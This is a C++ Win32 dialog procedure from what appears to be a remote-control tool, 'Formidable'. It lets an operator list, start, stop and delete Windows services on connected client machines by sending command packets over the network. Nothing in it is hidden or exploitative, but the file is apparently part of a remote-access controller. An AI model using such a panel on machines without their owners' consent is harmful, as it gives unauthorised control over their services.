#include "ServiceDialog.h"
#include "../GlobalState.h"
#include "../NetworkHelper.h"
#include "../../Common/Config.h"
#include "../resource.h"
#include "../Utils/StringHelper.h"
#include <CommCtrl.h>
#include <map>
#include <vector>

INT_PTR CALLBACK ServiceDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    static std::map<HWND, uint32_t> dlgToClientId;
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        dlgToClientId[hDlg] = clientId;
        
        // 设置图标
        SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_SERVICE)));
        SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_SERVICE)));
        
        HWND hList = GetDlgItem(hDlg, IDC_LIST_SERVICE);
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_DOUBLEBUFFER);
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"服务名";     lvc.cx = 150; SendMessageW(hList, LVM_INSERTCOLUMNW, 0, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"显示名";     lvc.cx = 200; SendMessageW(hList, LVM_INSERTCOLUMNW, 1, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"状态";       lvc.cx = 100; SendMessageW(hList, LVM_INSERTCOLUMNW, 2, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"启动类型";   lvc.cx = 80;  SendMessageW(hList, LVM_INSERTCOLUMNW, 3, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"服务类型";   lvc.cx = 100; SendMessageW(hList, LVM_INSERTCOLUMNW, 4, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"文件路径";   lvc.cx = 300; SendMessageW(hList, LVM_INSERTCOLUMNW, 5, (LPARAM)&lvc);
        
        ApplyModernTheme(hDlg);
        // 初始化后自动刷新
        SendMessage(hDlg, WM_COMMAND, IDC_BTN_SERVICE_REFRESH, 0);
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_SERVICE), 0, 0, rc.right, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        if (nm->idFrom == IDC_LIST_SERVICE) {
            if (nm->code == NM_RCLICK) {
                POINT pt;
                GetCursorPos(&pt);
                HMENU hMenu = CreatePopupMenu();
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_SERVICE_REFRESH, L"刷新列表");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_SERVICE_START, L"启动服务");
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_SERVICE_STOP, L"停止服务");
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_SERVICE_DELETE, L"删除服务");
                TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
                DestroyMenu(hMenu);
            } else if (nm->code == LVN_COLUMNCLICK) {
                LPNMLISTVIEW pnmlv = (LPNMLISTVIEW)lParam;
                HWND hList = pnmlv->hdr.hwndFrom;
                
                if (!g_SortInfo.count(hList)) {
                    g_SortInfo[hList] = { 0, true, hList };
                }
                
                if (g_SortInfo[hList].column == pnmlv->iSubItem) {
                    g_SortInfo[hList].ascending = !g_SortInfo[hList].ascending;
                } else {
                    g_SortInfo[hList].column = pnmlv->iSubItem;
                    g_SortInfo[hList].ascending = true;
                }
                
                ListView_SortItems(hList, ListViewCompareProc, (LPARAM)&g_SortInfo[hList]);
            }
        }
        break;
    }
    case WM_COMMAND: {
        uint32_t clientId = dlgToClientId[hDlg];
        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        auto SendServiceCtrl = [&](uint32_t action) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_SERVICE);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                wchar_t wName[256] = { 0 };
                LVITEMW lviName = { 0 };
                lviName.iSubItem = 0;
                lviName.pszText = wName;
                lviName.cchTextMax = 256;
                SendMessageW(hList, LVM_GETITEMTEXTW, index, (LPARAM)&lviName);
                std::string name = Formidable::Utils::StringHelper::WideToUTF8(wName);
                
                Formidable::CommandPkg pkg = { 0 };
                if (action == 1) pkg.cmd = Formidable::CMD_SERVICE_START;
                else if (action == 2) pkg.cmd = Formidable::CMD_SERVICE_STOP;
                else if (action == 3) pkg.cmd = Formidable::CMD_SERVICE_DELETE;
                else pkg.cmd = Formidable::CMD_SERVICE_LIST;
                
                pkg.arg1 = (uint32_t)name.size() + 1;
                
                size_t bodySize = sizeof(Formidable::CommandPkg) - 1 + name.size() + 1;
                std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                
                Formidable::CommandPkg* pPkg = (Formidable::CommandPkg*)(buffer.data() + sizeof(Formidable::PkgHeader));
                pPkg->cmd = pkg.cmd;
                pPkg->arg1 = pkg.arg1;
                memcpy(pPkg->data, name.c_str(), name.size() + 1);
                
                SendDataToClient(client, buffer.data(), (int)buffer.size());
            }
        };

        if (LOWORD(wParam) == IDC_BTN_SERVICE_REFRESH) {
            Formidable::CommandPkg pkg = { 0 };
            pkg.cmd = Formidable::CMD_SERVICE_LIST;
            pkg.arg1 = 0; // Get list
            size_t bodySize = sizeof(Formidable::CommandPkg);
            std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
            Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
            SendDataToClient(client, buffer.data(), (int)buffer.size());
        } else if (LOWORD(wParam) == IDC_BTN_SERVICE_START) {
            SendServiceCtrl(1);
        } else if (LOWORD(wParam) == IDC_BTN_SERVICE_STOP) {
            SendServiceCtrl(2);
        } else if (LOWORD(wParam) == IDC_BTN_SERVICE_DELETE) {
            SendServiceCtrl(3);
        } else if (LOWORD(wParam) == IDCANCEL) {
            EndDialog(hDlg, LOWORD(wParam));
            dlgToClientId.erase(hDlg);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE:
        EndDialog(hDlg, 0);
        dlgToClientId.erase(hDlg);
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}
